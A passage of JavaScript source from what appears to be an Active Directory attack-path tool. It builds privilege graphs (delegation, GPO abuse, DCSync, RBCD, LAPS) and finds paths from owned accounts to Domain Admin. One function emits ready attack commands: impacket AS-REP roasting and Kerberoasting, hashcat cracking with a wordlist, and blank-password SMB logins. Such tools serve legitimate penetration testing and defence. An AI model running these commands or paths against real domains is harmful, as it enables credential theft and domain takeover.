        if (g.operator_goal_sids.indexOf(rawSid) < 0) g.operator_goal_sids.push(rawSid);
      }
    }
    (g.members || []).forEach(function (e) { ensureKnownGroupSid(e[0]); ensureKnownGroupSid(e[1]); });
    (g.control || []).forEach(function (e) { ensureKnownGroupSid(e[0]); ensureKnownGroupSid(e[2]); });

    // 1. Infer domain names & domain SIDs when domains.json was omitted or incomplete
    Object.keys(names).forEach(function (sid) {
      var domFromName = domainFromName(names[sid]);
      if (domFromName && summary.domains.indexOf(domFromName) < 0) summary.domains.push(domFromName);
      var domPrefix = domainOfSid(sid);
      if (domPrefix && g.domain_sids.indexOf(domPrefix) < 0) g.domain_sids.push(domPrefix);
    });
    if (!summary.domain && summary.domains.length) summary.domain = summary.domains[0];
    if (summary.domain && summary.domains.indexOf(summary.domain) < 0) summary.domains.unshift(summary.domain);
    if (!g.domain_sid && g.domain_sids.length) g.domain_sid = g.domain_sids[0];
    g.domain_sids.forEach(function (dsid, idx) {
      if (!names[dsid]) {
        names[dsid] = summary.domains[idx] || summary.domain || dsid;
        types[dsid] = 'domains';
      }
    });

    // 2. Resolve Constrained Delegation targets to computer SIDs & add AllowedToDelegate edges
    var compByHost = {};
    Object.keys(names).forEach(function (sid) {
      if (types[sid] === 'computers') {
        var cname = String(names[sid]).toUpperCase();
        var cshort = cname.split('.')[0].split('@')[0].replace(/\$$/, '');
        compByHost[cname] = sid;
        compByHost[cshort] = sid;
      }
    });
    var cDelOut = [];
    (g.raw_delegation || []).forEach(function (entry) {
      var actorName = resolveSid(entry.sid, names) || entry.name;
      (entry.targets || []).forEach(function (rawTgt) {
        var tStr = isObj(rawTgt) ? String(rawTgt.ObjectIdentifier || rawTgt.Name || rawTgt.name || '') : String(rawTgt || '');
        if (!tStr) return;
        var hostPart = tStr.indexOf('/') >= 0 ? tStr.split('/')[1] : tStr;
        hostPart = hostPart.split(':')[0].toUpperCase();
        var hostShort = hostPart.split('.')[0].split('@')[0].replace(/\$$/, '');
        var targetSid = names[tStr] ? tStr : (compByHost[hostPart] || compByHost[hostShort] || '');
        if (targetSid && ! g._delegationIndexed) {
          addControlEdge(g, entry.sid, 'AllowedToDelegate', targetSid);
        }
        var targetLabel = targetSid ? resolveSid(targetSid, names) : tStr;
        var line = actorName + ' -> ' + targetLabel + (tStr.indexOf('/') >= 0 ? ' (' + tStr + ')' : '');
        if (cDelOut.indexOf(line) < 0) cDelOut.push(line);
      });
    });
    g._delegationIndexed = true;
    summary.constrained_delegation = cDelOut;

    // 3. Add traversal edges for non-broad LocalAdmins/PSRemote/RDP/DCOM and Computer -> HasSession -> User
    if (!g._sessionsIndexed) {
      g._sessionsIndexed = true;
      (g.local_admins || []).forEach(function (e) {
        if (!isBroadPrincipal(e[0])) addControlEdge(g, e[0], 'AdminTo', e[1]);
      });
      (g.psremote || []).forEach(function (e) {
        if (!isBroadPrincipal(e[0])) addControlEdge(g, e[0], 'CanPSRemote', e[1]);
      });
      (g.rdp || []).forEach(function (e) {
        if (!isBroadPrincipal(e[0])) addControlEdge(g, e[0], 'CanRDP', e[1]);
      });
      (g.dcom || []).forEach(function (e) {
        if (!isBroadPrincipal(e[0])) addControlEdge(g, e[0], 'ExecuteDCOM', e[1]);
      });
      (g.sessions || []).forEach(function (e) {
        // e is [userSid, computerSid]; compromising computerSid compromises userSid's session
        if (e[0] && e[1]) addControlEdge(g, e[1], 'HasSession', e[0]);
      });
    }

    // 4. Propagate GPO -> OU/Domain -> ChildObjects (GPOAbuse)
    if (!g.gpo_links) g.gpo_links = {};
    (g.raw_links || []).forEach(function (pair) {
      var a = pair[0], b = pair[1];
      var ta = types[a], tb = types[b];
      var gpoSid = '', containerSid = '';
      if (ta === 'gpos') { gpoSid = a; containerSid = b; }
      else if (tb === 'gpos') { gpoSid = b; containerSid = a; }
      else { containerSid = a; gpoSid = b; }
      var list = g.gpo_links[gpoSid] || (g.gpo_links[gpoSid] = []);
      if (list.indexOf(containerSid) < 0) list.push(containerSid);
    });
    (g.control || []).forEach(function (e) {
      if (/^gplink$/i.test(e[1])) {
        var list = g.gpo_links[e[0]] || (g.gpo_links[e[0]] = []);
        if (list.indexOf(e[2]) < 0) list.push(e[2]);
      }
    });
    var containsMap = g.contains || {};
    function descendantsOf(containerSid) {
      var res = [], seenC = {};
      var q = [containerSid];
      seenC[containerSid] = 1;
      for (var qi = 0; qi < q.length; qi++) {
        var cur = q[qi];
        var ch = containsMap[cur] || [];
        for (var ci = 0; ci < ch.length; ci++) {
          var cSid = ch[ci];
          if (!seenC[cSid]) {
            seenC[cSid] = 1;
            res.push(cSid);
            q.push(cSid);
          }
        }
      }
      return res;
    }
    // Filter Domain Controllers discovered via group membership or Domain Controllers OU from unconstrained_delegation
    if (!g.dc_computers) g.dc_computers = {};
    (g.members || []).forEach(function (e) {
      var mSid = e[0], grpSid = e[1];
      var cGrpSid = canonicalWellKnownSid(grpSid);
      var grpBase = String(names[grpSid] || '').split('@')[0].trim().toUpperCase();
      if (/-(?:516|521)$/.test(grpSid) || /^S-1-5-9$/i.test(cGrpSid)
          || grpBase === 'DOMAIN CONTROLLERS' || grpBase === 'READ-ONLY DOMAIN CONTROLLERS' || grpBase === 'ENTERPRISE DOMAIN CONTROLLERS') {
        g.dc_computers[mSid] = 1;
        if (names[mSid]) g.dc_computers[String(names[mSid]).toUpperCase()] = 1;
      }
    });
    Object.keys(g.contains || {}).forEach(function (ouSid) {
      if (types[ouSid] === 'ous' && String(names[ouSid] || '').split('@')[0].trim().toUpperCase() === 'DOMAIN CONTROLLERS') {
        (g.contains[ouSid] || []).forEach(function (chSid) {
          if (types[chSid] === 'computers') {
            g.dc_computers[chSid] = 1;
            if (names[chSid]) g.dc_computers[String(names[chSid]).toUpperCase()] = 1;
          }
        });
      }
    });
    if (Array.isArray(summary.unconstrained_delegation) && summary.unconstrained_delegation.length) {
      summary.unconstrained_delegation = summary.unconstrained_delegation.filter(function (cn) {
        var cu = String(cn || '').toUpperCase();
        return !g.dc_computers[cu];
      });
    }

    var gpoAbuseList = [];
    var gpoControls = {};
    var gpoWritableMeta = { gpos: [], gpo_ids: [], principals: [] };
    (g.control || []).forEach(function (e) {
      var src = e[0], right = e[1], dst = e[2];
      if (types[dst] === 'gpos' && ABUSABLE_ACE[right] && !isBroadPrincipal(src) && !isBuiltinPrivilegedSid(src, names[src])) {
        (gpoControls[dst] = gpoControls[dst] || []).push({ actor: src, right: right });
        var gName = resolveSid(dst, names);
        var aName = resolveSid(src, names);
        if (gName && gpoWritableMeta.gpos.indexOf(gName) < 0) gpoWritableMeta.gpos.push(gName);
        if (dst && gpoWritableMeta.gpo_ids.indexOf(dst) < 0) gpoWritableMeta.gpo_ids.push(dst);
        if (aName && gpoWritableMeta.principals.indexOf(aName) < 0) gpoWritableMeta.principals.push(aName);
      }
    });
    Object.keys(g.gpo_links).forEach(function (gpoSid) {
      var containers = g.gpo_links[gpoSid] || [];
      var affected = [];
      containers.forEach(function (cSid) {
        if (types[cSid] === 'domains' && affected.indexOf(cSid) < 0) affected.push(cSid);
        descendantsOf(cSid).forEach(function (dSid) {
          if (types[dSid] !== 'ous' && types[dSid] !== 'containers' && affected.indexOf(dSid) < 0) {
            affected.push(dSid);
          }
        });
      });
      if (!g._gpoIndexed) {
        affected.forEach(function (childSid) {
          addControlEdge(g, gpoSid, 'GPOAbuse', childSid);
        });
      }
      var controllers = gpoControls[gpoSid] || [];
      controllers.forEach(function (ctrl) {
        affected.forEach(function (childSid) {
          var line = resolveSid(ctrl.actor, names) + ' -[' + ctrl.right + ']-> ' + resolveSid(gpoSid, names) + ' -> ' + resolveSid(childSid, names);
          if (gpoAbuseList.indexOf(line) < 0) gpoAbuseList.push(line);
        });
      });
    });
    g._gpoIndexed = true;
    summary.gpo_abuse = gpoAbuseList;
    summary._gpo_writable_meta = gpoWritableMeta;

    // 5. Summarize RBCD, SID History, gMSA, LAPS from control edges + properties
    var rbcdList = [];
    var sidHistList = [];
    var gmsaList = (summary.gmsa_accounts || []).slice();
    var lapsList = (summary.laps_computers || []).slice();
    var nonPrivAclEdges = [];
    var adminSidSet = buildAdminSidSet(g);
    (g.control || []).forEach(function (e) {
      var src = e[0], right = e[1], dst = e[2];
      var srcBuiltin = isBuiltinPrivilegedSid(src, names[src]);
      var gmsaExcl = right === 'ReadGMSAPassword' && isGmsaExcludedSource(g, adminSidSet, src, names);
      if (ABUSABLE_ACE[right] && !srcBuiltin && !gmsaExcl) nonPrivAclEdges.push(e);
      if ((right === 'AllowedToAct' || right === 'AddAllowedToAct') && !isBroadPrincipal(src) && !srcBuiltin) {
        var rLine = resolveSid(src, names) + ' -> ' + resolveSid(dst, names) + ' (' + right + ')';
        if (rbcdList.indexOf(rLine) < 0) rbcdList.push(rLine);
      } else if (right === 'HasSIDHistory') {
        var sLine = resolveSid(src, names) + ' -> ' + resolveSid(dst, names);
        if (sidHistList.indexOf(sLine) < 0) sidHistList.push(sLine);
      } else if (right === 'ReadGMSAPassword' && !isBroadPrincipal(src) && !srcBuiltin && !gmsaExcl) {
        var gLine = resolveSid(src, names) + ' -> ' + resolveSid(dst, names);
        if (gmsaList.indexOf(gLine) < 0) gmsaList.push(gLine);
      } else if ((right === 'ReadLAPSPassword' || right === 'SyncLAPSPassword') && !isBroadPrincipal(src) && !srcBuiltin) {
        var lLine = resolveSid(src, names) + ' -> ' + resolveSid(dst, names);
        if (lapsList.indexOf(lLine) < 0) lapsList.push(lLine);
      }
    });
    g.acl_edges = nonPrivAclEdges;
    summary.acl_edges = nonPrivAclEdges;
    summary.rbcd_targets = rbcdList;
    summary.sid_history = sidHistList;
    summary.gmsa_accounts = gmsaList;
    summary.laps_computers = lapsList;

    // 6. Standard census lists
    var censusKeys = ['domain_admins', 'enterprise_admins', 'high_value', 'can_rdp', 'can_winrm'];
    censusKeys.forEach(function (key) {
      summary[key] = (summary[key] || []).map(function (x) { return resolveSid(x, names); });
    });

    // DCSync principals across all collected domain objects
    var domSet = {};
    if (g.domain_sid) domSet[g.domain_sid] = 1;
    (g.domain_sids || []).forEach(function (ds) { if (ds) domSet[ds] = 1; });
    if (Object.keys(domSet).length) {
      var byPrincipal = {};
      (g.control || []).forEach(function (edge) {
        var psid = edge[0], right = edge[1], tgt = edge[2];
        if (domSet[tgt]) {
          var key = psid + '\u0000' + tgt;
          (byPrincipal[key] = byPrincipal[key] || { psid: psid, rights: {} }).rights[right] = 1;
        }
      });
      var dcsync = [];
      Object.keys(byPrincipal).forEach(function (k) {
        var item = byPrincipal[k], psid = item.psid, rights = item.rights;
        if (isBuiltinPrivilegedSid(psid, names[psid]) || (g.dc_computers && g.dc_computers[psid])) return;
        var hasRepl = rights.GetChanges && (rights.GetChangesAll || rights.DCSync);
        var canGrant = false;
        for (var rr in rights) { if (DCSYNC_OWNING[rr]) { canGrant = true; break; } }
        if (hasRepl || canGrant) {
          var lbl = resolveSid(psid, names);
          if (dcsync.indexOf(lbl) < 0) dcsync.push(lbl);
        }
      });
      summary.dcsync_principals = dcsync;
    }

    var adminTo = [];
    (g.local_admins || []).forEach(function (e) {
      if (isBroadPrincipal(e[0])) adminTo.push(resolveSid(e[0], names) + ' \u2192 ' + resolveSid(e[1], names));
    });
    summary.admin_to = adminTo;

    var daMembers = {};
    var allDaSids = (g.da_sids && g.da_sids.length) ? g.da_sids : (g.da_sid ? [g.da_sid] : []);
    var allEaSids = (g.ea_sids && g.ea_sids.length) ? g.ea_sids : (g.ea_sid ? [g.ea_sid] : []);
    allDaSids.concat(allEaSids).forEach(function (gSid) {
      if (!gSid) return;
      daMembers[gSid] = 1;
      (g.members || []).forEach(function (e) { if (e[1] === gSid) daMembers[e[0]] = 1; });
    });
    var sessions = [];
    (g.sessions || []).forEach(function (e) {
      if (daMembers[e[0]]) sessions.push(resolveSid(e[0], names) + ' @ ' + resolveSid(e[1], names));
    });
    summary.da_sessions = sessions;

    [['rdp', 'rdp_reach'], ['psremote', 'psremote_reach'], ['dcom', 'dcom_reach']].forEach(function (pair) {
      var reach = [];
      (g[pair[0]] || []).forEach(function (e) {
        if (isBroadPrincipal(e[0])) reach.push(resolveSid(e[0], names) + ' \u2192 ' + resolveSid(e[1], names));
      });
      summary[pair[1]] = reach;
    });

    // Foreign principals: compare member's domain SID prefix against the target group's domain SID prefix
    // (or domain suffix in names) so multi-domain collections do not falsely flag intra-domain memberships.
    var primaryDomSid = domainOfSid(g.domain_sid || '') || domainOfSid(g.da_sid || '') || domainOfSid(g.ea_sid || '');
    var privGroups = {};
    allDaSids.concat(allEaSids).concat(g.admin_sids || []).forEach(function (s) { if (s) privGroups[s] = 1; });
    var foreign = [];
    (g.members || []).forEach(function (e) {
      var mSid = e[0], gSid = e[1];
      var md = domainOfSid(mSid);
      var gd = domainOfSid(gSid);
      if (!md) return;
      var isCrossDomain = false;
      if (gd) {
        isCrossDomain = (md !== gd);
      } else {
        var mDomName = domainFromName(names[mSid]);
        var gDomName = domainFromName(names[gSid]);
        if (mDomName && gDomName) isCrossDomain = (mDomName !== gDomName);
        else if (primaryDomSid) isCrossDomain = (md !== primaryDomSid);
      }
      if (isCrossDomain) {
        var tag = privGroups[gSid] ? ' (privileged)' : '';
        foreign.push(resolveSid(mSid, names) + ' \u2192 ' + resolveSid(gSid, names) + tag);
      }
    });
    summary.foreign_principals = foreign;
    return summary;
  }

  // Bounded owned->DA pathfinder
  function firstAbusable(chain) {
    for (var i = 0; i < (chain || []).length; i++) {
      var h = chain[i];
      if (ABUSABLE_ACE[h.edge]) {
        var toShort = String(h.to).split('@')[0].trim();
        var fromShort = String(h.from).split('@')[0].trim();
        return {
          edge: h.edge,
          target: toShort,
          from: fromShort,
          to: toShort,
          kind: MEMBER_ACE[h.edge] ? 'group' : 'object'
        };
      }
    }
    return null;
  }

  var EDGE_RANK = {
    MemberOf: 0, GenericAll: 1, WriteDacl: 2, AddSelf: 3, AddMember: 4,
    GenericWrite: 5, WriteOwner: 6, Owns: 7, AllExtendedRights: 8,
    ForceChangePassword: 9, AddKeyCredentialLink: 10, GetChangesAll: 11,
    DCSync: 11, GetChanges: 12, WriteSPN: 13, AddAllowedToAct: 14,
    AllowedToAct: 15, AllowedToDelegate: 16, HasSIDHistory: 17, GPOAbuse: 18,
    ReadGMSAPassword: 19, ReadLAPSPassword: 20, SyncLAPSPassword: 21,
    AdminTo: 22, CanPSRemote: 23, CanRDP: 24, ExecuteDCOM: 25, HasSession: 26
  };
  function edgeRank(e) { return EDGE_RANK[e] !== undefined ? EDGE_RANK[e] : 50; }

  // Collect transitive MemberOf groups for a set of starting principal SIDs without expanding
  // through terminal admin goal groups. Allows owned non-admin users who belong to built-in
  // operator groups (such as Account Operators) to traverse those groups' outbound ACLs while
  // keeping unowned built-in privileged principals out of reachability paths.
  function memberGroupClosure(graph, startSids) {
    var allowed = {};
    if (!graph || !startSids || !startSids.length) return allowed;
    var stop = {};
    if (graph.da_sid) stop[graph.da_sid] = 1;
    if (graph.ea_sid) stop[graph.ea_sid] = 1;
    if (graph.domain_sid) stop[graph.domain_sid] = 1;
    (graph.da_sids || []).forEach(function (s) { if (s) stop[s] = 1; });
    (graph.ea_sids || []).forEach(function (s) { if (s) stop[s] = 1; });
    (graph.admin_sids || []).forEach(function (s) { if (s) stop[s] = 1; });
    (graph.domain_sids || []).forEach(function (s) { if (s) stop[s] = 1; });
    var memAdj = {};
    (graph.members || []).forEach(function (e) {
      (memAdj[e[0]] = memAdj[e[0]] || []).push(e[1]);
    });
    var q = [], seen = {};
    startSids.forEach(function (s) {
      if (s && !seen[s] && !stop[s]) { seen[s] = 1; q.push(s); }
    });
    for (var qi = 0; qi < q.length; qi++) {
      var cur = q[qi];
      (memAdj[cur] || []).forEach(function (grp) {
        if (!grp || stop[grp]) return;
        allowed[grp] = 1;
        if (!seen[grp]) { seen[grp] = 1; q.push(grp); }
      });
    }
    return allowed;
  }

  // Build deduplicated adjacency from graph.members and graph.control
  function buildDeduplicatedGraph(graph, allowedPrivSids) {
    var names = graph.names || {};
    var dcComputers = graph.dc_computers || {};
    var adminSidSet = buildAdminSidSet(graph);
    var domSet = {};
    if (graph.domain_sid) domSet[graph.domain_sid] = 1;
    (graph.domain_sids || []).forEach(function (ds) { if (ds) domSet[ds] = 1; });

    var domRightsBySrc = {};
    (graph.control || []).forEach(function (e) {
      if (domSet[e[2]]) {
        var k = e[0] + '\u0000' + e[2];
        (domRightsBySrc[k] = domRightsBySrc[k] || {})[e[1]] = 1;
      }
    });
    function validControl(src, right, dst) {
      if (!ABUSABLE_ACE[right]) return false;
      if (right === 'ReadGMSAPassword' && isGmsaExcludedSource(graph, adminSidSet, src, names)) {
        return false;
      }
      if ((isBuiltinPrivilegedSid(src, names[src]) || dcComputers[src]) && !(allowedPrivSids && allowedPrivSids[src])) {
        return false;
      }
      if (domSet[dst]) {
        if (DCSYNC_OWNING[right] || right === 'WriteOwner' || DCSYNC_RIGHTS[right] || right === 'GPOAbuse' || right === 'HasSIDHistory') return true;
        if (right === 'GetChanges') {
          var r = domRightsBySrc[src + '\u0000' + dst] || {};
          return !!(r.GetChangesAll || r.DCSync || r.GetChangesInFilteredSet);
        }
        return false;
      }
      return true;
    }
    var adjMap = {}, hasEdge = {}, radj = {};
    (graph.members || []).forEach(function (e) {
      var k = e[0] + '\u0000' + e[1];
      if (!hasEdge[k]) {
        hasEdge[k] = 1;
        adjMap[k] = { src: e[0], dst: e[1], edge: 'MemberOf', alts: [] };
        (radj[e[1]] = radj[e[1]] || []).push(e[0]);
      }
    });
    (graph.control || []).forEach(function (e) {
      var src = e[0], right = e[1], dst = e[2];
      if (!validControl(src, right, dst)) return;
      var k = src + '\u0000' + dst;
      if (!hasEdge[k]) {
        hasEdge[k] = 1;
        (radj[dst] = radj[dst] || []).push(src);
      }
      if (!adjMap[k]) {
        adjMap[k] = { src: src, dst: dst, edge: right, alts: [right] };
      } else {
        if (adjMap[k].alts.indexOf(right) < 0) adjMap[k].alts.push(right);
        if (adjMap[k].edge !== 'MemberOf' && edgeRank(right) < edgeRank(adjMap[k].edge)) {
          adjMap[k].edge = right;
        }
      }
    });
    var adj = {};
    Object.keys(adjMap).forEach(function (k) {
      var item = adjMap[k];
      (adj[item.src] = adj[item.src] || []).push(item);
    });
    var tier0Goals = {};
    if (graph.da_sid) tier0Goals[graph.da_sid] = 1;
    if (graph.ea_sid) tier0Goals[graph.ea_sid] = 1;
    if (graph.domain_sid) tier0Goals[graph.domain_sid] = 1;
    (graph.da_sids || []).forEach(function (s) { if (s) tier0Goals[s] = 1; });
    (graph.ea_sids || []).forEach(function (s) { if (s) tier0Goals[s] = 1; });
    if (Array.isArray(graph.admin_sids)) {
      graph.admin_sids.forEach(function (s) { if (s) tier0Goals[s] = 1; });
    } else if (isObj(graph.admin_sids)) {
      Object.keys(graph.admin_sids).forEach(function (s) { if (graph.admin_sids[s]) tier0Goals[s] = 1; });
    }
    (graph.domain_sids || []).forEach(function (s) { if (s) tier0Goals[s] = 1; });

    var operatorGoals = {};
    (graph.operator_goal_sids || []).forEach(function (s) {
      if (s && !tier0Goals[s]) operatorGoals[s] = 1;
    });

    var goals = Object.assign({}, tier0Goals, operatorGoals);

    function reverseBfsDist(goalMap) {
      var dMap = {}, rq = [];
      Object.keys(goalMap).forEach(function (g) { dMap[g] = 0; rq.push(g); });
      for (var qi = 0; qi < rq.length; qi++) {
        var node = rq[qi], d = dMap[node];
        (radj[node] || []).forEach(function (src) {
          if (dMap[src] === undefined) { dMap[src] = d + 1; rq.push(src); }
        });
      }
      return dMap;
    }

    var dist = reverseBfsDist(goals);
    var tier0Dist = reverseBfsDist(tier0Goals);
    return { adj: adj, radj: radj, hasEdge: hasEdge, goals: goals, tier0Goals: tier0Goals, operatorGoals: operatorGoals, dist: dist, tier0Dist: tier0Dist };
  }

  function ownedPaths(summary, ownedPrincipals, opts) {
    opts = opts || {};
    var maxPaths = opts.maxPaths || 16;
    var maxDepth = opts.maxDepth || 8;
    var graph = (summary && summary._graph) || summary || {};
    var names = graph.names || {};
    var dcComputers = graph.dc_computers || {};
    var owned = resolveOwnedSids(graph, ownedPrincipals);
    var nonPrivOwned = owned.filter(function (s) {
      return !isBuiltinPrivilegedSid(s, names[s]) && !dcComputers[s];
    });
    var allowedPriv = memberGroupClosure(graph, nonPrivOwned);
    var dg = buildDeduplicatedGraph(graph, allowedPriv);
    var goals = dg.goals, tier0Goals = dg.tier0Goals || goals, operatorGoals = dg.operatorGoals || {};
    var adj = dg.adj, hasEdge = dg.hasEdge, distToGoal = dg.dist, tier0Dist = dg.tier0Dist || distToGoal;
    if (!owned.length || !Object.keys(goals).length) return { paths: [], first: null, owned_sids: owned.slice() };

    var found = [];
    var types = graph.types || {};
    var budget = opts.budget || 50000;
    var spent = 0;

    owned.forEach(function (sid) {
      var startDist = distToGoal[sid];
      var v0 = {}; v0[sid] = 1;
      var q = [{ node: sid, nodes: [sid], hops: [], visited: v0, afterOperatorGoal: !!operatorGoals[sid] }];
      var pFound = [];
      for (var qi = 0; qi < q.length && pFound.length < maxPaths && spent < budget; qi++) {
        var cur = q[qi]; spent++;
        if (cur.hops.length >= maxDepth) continue;
        var out = adj[cur.node] || [];
        var activeGoals = cur.afterOperatorGoal ? tier0Goals : goals;
        var activeDist = cur.afterOperatorGoal ? tier0Dist : distToGoal;
        var curDist = activeDist[cur.node];
        var effStartDist = cur.afterOperatorGoal ? tier0Dist[sid] : startDist;
        for (var i = 0; i < out.length; i++) {
          var item = out[i], edge = item.edge, dst = item.dst;
          if (cur.visited[dst]) continue;
          if (activeDist[dst] === undefined) continue;
          if (!activeGoals[dst]) {
            var advancesTier0 = tier0Dist[dst] !== undefined && tier0Dist[cur.node] !== undefined && tier0Dist[dst] < tier0Dist[cur.node];
            if (cur.hops.length > 0 && curDist === 1 && !advancesTier0) continue;
            if (effStartDist === 1 && cur.hops.length > 0 && activeDist[dst] >= curDist && !advancesTier0) continue;
          }
          var chord = false;
          for (var ai = 0; ai < cur.nodes.length - 1; ai++) {
            if (hasEdge[cur.nodes[ai] + '\u0000' + dst]) { chord = true; break; }
          }
          if (chord) continue;
          var hop = {
            from: names[cur.node] || cur.node,
            edge: edge,
            to: names[dst] || dst,
            to_kind: types[dst] || '',
            from_sid: cur.node,
            to_sid: dst
          };
          if (item.alts && item.alts.length > 1) hop.alt_edges = item.alts.slice();
          var nextHops = cur.hops.concat([hop]);
          if (tier0Goals[dst]) {
            pFound.push(nextHops);
            if (pFound.length >= maxPaths) break;
            continue;
          }
          if (!cur.afterOperatorGoal && operatorGoals[dst]) {
            if (firstAbusable(nextHops) !== null || tier0Dist[dst] === undefined) {
              pFound.push(nextHops);
              if (pFound.length >= maxPaths) break;
            }
            if (tier0Dist[dst] !== undefined) {
              var nvOp = Object.assign({}, cur.visited); nvOp[dst] = 1;
              q.push({ node: dst, nodes: cur.nodes.concat([dst]), hops: nextHops, visited: nvOp, afterOperatorGoal: true });
            }
            continue;
          }
          var nv = Object.assign({}, cur.visited); nv[dst] = 1;
          q.push({ node: dst, nodes: cur.nodes.concat([dst]), hops: nextHops, visited: nv, afterOperatorGoal: cur.afterOperatorGoal });
        }
      }
      pFound.forEach(function (p) { found.push(p); });
    });

    if (!found.length) return { paths: [], first: null, owned_sids: owned.slice() };
    found.sort(function (a, b) { return a.length - b.length; });
    if (found.length > maxPaths) found = found.slice(0, maxPaths);
    var firstAbuse = null;
    for (var fi = 0; fi < found.length; fi++) {
      firstAbuse = firstAbusable(found[fi]);
      if (firstAbuse) break;
    }
    return { paths: found, first: firstAbuse, owned_sids: owned.slice() };
  }

  function typeMatchesFilter(nodeType, allowedTypes) {
    if (!allowedTypes || !allowedTypes.length) return true;
    var t = String(nodeType || '').toLowerCase();
    var singular = SINGULAR_KIND[t] || t;
    var plural = t.slice(-1) === 's' ? t : (t + 's');
    return allowedTypes.indexOf(t) >= 0 || allowedTypes.indexOf(singular) >= 0 || allowedTypes.indexOf(plural) >= 0;
  }

  function nearestToGoal(summary, opts) {
    opts = opts || {};
    var graph = (summary && summary._graph) || summary || {};
    var names = graph.names || {}, types = graph.types || {};
    var dg = buildDeduplicatedGraph(graph);
    var goals = dg.goals, dist = dg.dist;
    var out = [];
    Object.keys(dist).forEach(function (sid) {
      if (goals[sid] || dist[sid] === 0) return;
      var t = types[sid] || '';
      if (!typeMatchesFilter(t, opts.types)) return;
      out.push({ name: names[sid] || sid, sid: sid, type: t, hops: dist[sid] });
    });
    out.sort(function (a, b) { return a.hops - b.hops || (a.name < b.name ? -1 : 1); });
    return out;
  }

  function controls(summary, principal, opts) {
    opts = opts || {};
    var maxDepth = opts.maxDepth || 8;
    var graph = (summary && summary._graph) || summary || {};
    var names = graph.names || {}, types = graph.types || {};
    var start = resolvePrincipalSid(graph, principal);
    if (!start) return { principal: principal, controls: [], groups: [], count: 0, inbound: [] };
    var startAllow = memberGroupClosure(graph, [start]);
    startAllow[start] = 1;
    var dg = buildDeduplicatedGraph(graph, startAllow);
    var adj = dg.adj;
    var seen = {}; seen[start] = 1;
    var q = [{ sid: start, hops: 0 }], ctrl = {}, groups = {};
    for (var qi = 0; qi < q.length; qi++) {
      var cur = q[qi]; if (cur.hops >= maxDepth) continue;
      (adj[cur.sid] || []).forEach(function (item) {
        var edge = item.edge, dst = item.dst;
        if (edge === 'MemberOf') {
          if (/group/.test(String(types[dst] || ''))) groups[names[dst] || dst] = 1;
        } else if (!ctrl[dst] || ctrl[dst].hops > cur.hops + 1) {
          ctrl[dst] = { name: names[dst] || dst, sid: dst, type: types[dst] || '', edge: edge, hops: cur.hops + 1 };
        }
        if (!seen[dst]) { seen[dst] = 1; q.push({ sid: dst, hops: cur.hops + 1 }); }
      });
    }
    var list = Object.keys(ctrl).map(function (k) { return ctrl[k]; });
    list.sort(function (a, b) { return a.hops - b.hops || (a.name < b.name ? -1 : 1); });
    var inMap = {};
    (graph.control || []).forEach(function (e) {
      if (e[2] !== start || e[0] === start) return;
      var srcName = names[e[0]] || '';
      if (!srcName || isBroadPrincipal(e[0]) || /^S-1-\d+-\d+$/.test(srcName)) return;
      var right = e[1];
      if (!ABUSABLE_ACE[right]) return;
      if (!inMap[srcName] || edgeRank(right) < edgeRank(inMap[srcName].edge)) {
        inMap[srcName] = { name: srcName, sid: e[0], type: types[e[0]] || '', edge: right };
      }
    });
    var inbound = Object.keys(inMap).map(function (k) { return inMap[k]; });
    inbound.sort(function (a, b) { return edgeRank(a.edge) - edgeRank(b.edge) || (a.name < b.name ? -1 : 1); });
    return { principal: names[start] || principal, sid: start, controls: list, groups: Object.keys(groups).sort(), count: list.length, inbound: inbound };
  }

  function principalProfile(summary, principal) {
    summary = summary || {};
    var g = summary._graph || summary || {};
    var names = g.names || {}, types = g.types || {};
    var sid = resolvePrincipalSid(g, principal);
    var fullName = (sid && names[sid]) ? names[sid] : String(principal == null ? '' : principal);
    var fullUp = fullName.toUpperCase();
    var short = fullName.split('@')[0].toUpperCase();
    var type = sid ? (types[sid] || '') : '';
    function inList(list) {
      return (list || []).some(function (x) {
        var xStr = String(x || '').toUpperCase();
        if (xStr === fullUp) return true;
        if (xStr.indexOf('@') >= 0 && fullUp.indexOf('@') >= 0) return xStr === fullUp;
        return xStr.split('@')[0].split(' ')[0] === short;
      });
    }
    return {
      name: fullName,
      short: short,
      sid: sid,
      type: type,
      domain: domainFromName(fullName) || summary.domain || '',
      kerberoastable: inList(summary.kerberoastable),
      asrep_roastable: inList(summary.asrep_roastable),
      password_not_required: inList(summary.password_not_required),
      dcsync: inList(summary.dcsync_principals),
      unconstrained: inList(summary.unconstrained_delegation),
      high_value: inList(summary.high_value)
    };
  }

  function acquisitionLines(summary, principal, ctx) {
    ctx = ctx || {};
    var p = principalProfile(summary, principal);
    var dc = ctx.dc || '<dc-ip>';
    var domain = p.domain || (summary && summary.domain) || '<domain>';
    var tgt = p.short;
    var low = tgt.toLowerCase();
    var you = ctx.you ? String(ctx.you).split('@')[0] : null;
    var out = [];
    if (p.asrep_roastable) {
      out.push({
        why: 'DONT_REQ_PREAUTH: AS-REP roast, no credential needed.',
        cmd: 'impacket-GetNPUsers ' + domain + '/' + tgt + ' -no-pass -dc-ip ' + dc + ' -format hashcat'
      });
      out.push({
        why: 'Crack the AS-REP hash offline.',
        cmd: 'hashcat -m 18200 ' + low + '.asrep /usr/share/wordlists/rockyou.txt'
      });
    }
    if (p.kerberoastable) {
      var auth = (you ? (domain + '/' + you) : (domain + '/<youruser>')) + ":'" + (ctx.pw ? String(ctx.pw).replace(/'/g, "'\\''") : '<password>') + "'";
      out.push({
        why: 'Has an SPN: Kerberoast (needs any one valid domain credential).',
        cmd: 'impacket-GetUserSPNs ' + auth + ' -request-user ' + tgt + ' -dc-ip ' + dc
      });
      out.push({
        why: 'Crack the TGS hash offline.',
        cmd: 'hashcat -m 13100 ' + low + '.kerb /usr/share/wordlists/rockyou.txt'
      });
    }
    if (p.password_not_required) {
      out.push({
        why: 'PASSWD_NOTREQD: may authenticate with a blank password, costs nothing to try.',
        cmd: 'nxc smb ' + dc + ' -u ' + tgt + " -p ''"
      });
    }
    return out;
  }

  // Detect short-name collisions across domains so colliding names keep @DOMAIN while unique names stay short.
  function collidingShortNames(names) {
    var domsByShort = {};
    Object.keys(names || {}).forEach(function (sid) {
      var nm = String(names[sid] || '');
      var sh = nm.split('@')[0].toUpperCase();
      var dm = domainFromName(nm) || sid;
      if (!sh) return;
      var dset = domsByShort[sh] || (domsByShort[sh] = {});
      dset[dm] = 1;
    });
    var collisions = {};
    Object.keys(domsByShort).forEach(function (sh) {
      if (Object.keys(domsByShort[sh]).length > 1) collisions[sh] = 1;
    });
    return collisions;
  }

  function principalList(summary, opts) {
    opts = opts || {};
